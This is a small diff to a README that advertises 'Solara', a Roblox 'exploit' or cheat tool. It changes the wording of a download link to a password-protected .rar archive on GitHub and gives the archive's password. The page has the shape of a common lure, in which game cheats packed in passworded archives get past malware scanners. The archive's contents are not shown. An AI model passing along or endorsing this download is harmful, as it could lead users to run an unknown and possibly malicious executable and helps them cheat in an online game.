@@ -2,7 +2,7 @@
 
   Solara - 8 lvl exploit for roblox
 
-  [Click Here To Install](https://github.com/ClassicScripter/Solara-Roblox/releases/download/Download/SolaraV3.rar)
+  [Download](https://github.com/ClassicScripter/Solara-Roblox/releases/download/Download/SolaraV3.rar)
 [Pass - SolV3]
 
   Status : Worked🟢
